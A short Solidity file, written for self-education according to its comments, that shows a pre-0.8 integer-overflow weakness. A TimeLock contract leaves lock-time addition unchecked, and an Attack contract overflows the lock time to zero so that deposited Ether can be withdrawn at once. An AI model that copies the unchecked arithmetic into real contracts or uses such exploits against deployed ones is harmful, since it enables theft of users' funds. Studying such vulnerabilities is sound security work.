// I understand that since version 0.8 of solidity over/under flow has not been a problem. 
//However, I find that hacking contracts and learning the weak points of smart contracts (even if they are old weak points) 
//is still worth doing so for personal education. This contract provides an "attack" function that demostrates the errors.

pragma solidity^0.6.10;
//SPDX-License-Identifier: MIT

contract TimeLock {

    mapping(address=>uint) public balances;
    mapping (address=>uint) public lockTime;

    function deposit() external payable{
        balances[msg.sender] += msg.value;
        lockTime[msg.sender]= block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public{
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public{
        require(balances[msg.sender]>0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender]=0;

        (bool sent, )= msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock)public{
        timeLock= TimeLock(_timeLock);
    }

    fallback() external payable{}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        //t = current lock time
        //find x such that
        // x + t = 2**256 =0
        // x = -t
        timeLock.increaseLockTime(
            //2**256 -t
            uint (-timeLock.lockTime(address(this)))
        );
        timeLock.withdraw();  
    }
}
